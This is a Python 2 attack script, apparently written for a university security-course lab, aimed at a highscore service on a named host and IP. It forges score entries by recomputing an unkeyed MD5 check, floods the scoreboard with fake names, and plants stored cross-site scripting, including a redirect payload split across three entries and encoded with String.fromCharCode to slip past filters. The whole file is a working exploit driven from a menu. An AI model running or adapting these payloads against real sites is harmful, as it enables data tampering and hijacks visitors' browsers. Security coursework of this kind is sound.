import hashlib
import json
from pwn import *
import requests
import os
context.log_level = 'error'

tcp_server = '194.47.148.179'
tcp_port = 2242

# Get highscore in json format, then parse and return highest score
def get_highscores(output=True):
	r = requests.get("http://dv2546.cse.bth.se/cs/getJsonScore.php")
	
	#Fix for invalid json ,]
	formated = r.text[:-3] + "]"
	formated = formated.replace('\n', '').replace('\r', '')
	#parse it 
	resp = json.loads(formated)

	#print highscore list if output is set
	if output:
		for user in resp:
			print "%12s\t%12s" % (user["name"], user["score"])

	#return highest score on the scoreboard
	return resp[0]["score"]

def add_highscore(name, email, score):
	r = remote(tcp_server,tcp_port) #open tcp connection to server
	
	#Circumvent security feature: signature check
	m = hashlib.md5()
	m.update(str(score))
	md5_score = m.hexdigest()
	
	r.send("%s'%s'%s'%s" % (name, email, str(score), md5_score)) #send new highscore
	r.close() #close connection


#This function is used to convert strings to strings without quotations. Used for XSS payloads
def convert(strin):
	resp = "String.fromCharCode("
	for a in strin:
		resp += "" + str(ord(a)) + ","
	resp = resp[:-1] + ")"
	return resp

#Fill whole scoreboard with our own scores.
def payload_fill_all(score):
	iteration = 1
	for score in range(score, score+10):
		add_highscore("Ad-Hoc Richard %d" % iteration, 'test@we.se', score)
		iteration+=1
	#Create payload
	#overflow table with new entry
	#XSS with example alert and bold text
	payload = "Hugo.B & Fredrik.H</td><td>Worthy</td><tr><td>2</td><td><b>Fake Slot</b><script>alert(1)</script>"
	add_highscore(payload, 'test@we.se', score+11)

#XSS with redirect and paylod > 100 bytes
def rick_rolled(score):
	a = convert("https://bit")
	b = convert(".ly/IqT6zt")
	payload1 = "<script>var a=%s</script>" % a
	payload2 = "<script>var b=%s</script>" % b
	payload3 = "<script>document.location=a+b;</script>"

	add_highscore(payload1, 'aaa@bbb.se', score+4)
	add_highscore(payload2, 'aaa1@bbb.se', score+3)
	add_highscore(payload3, 'aaa2@bbb.se', score+2)

#Menu
while True:
	print "What would do like to do?"
	print "1) Show highscore"
	print "2) Get highest possible score"
	print "3) Flood highscore, XSS"
	print "4) Rick rolled, Arbitrary Code Execution"
	print "5) Exit"
	decision = raw_input(">")
	decision = decision.rstrip()

	os.system('clear');	

	highest_score = get_highscores(False)
	
	if decision == "1":
		get_highscores()
	elif decision == "2":
		print "Enter name: "
		name = raw_input()
		name = name.rstrip()
		add_highscore(name, 'example@example.example', highest_score+1)
	elif decision == "3":	
		payload_fill_all(highest_score+1)
	elif decision == "4":
		rick_rolled(highest_score+1)
	else:
		break
	raw_input("> Enter to continue")
	os.system("clear")
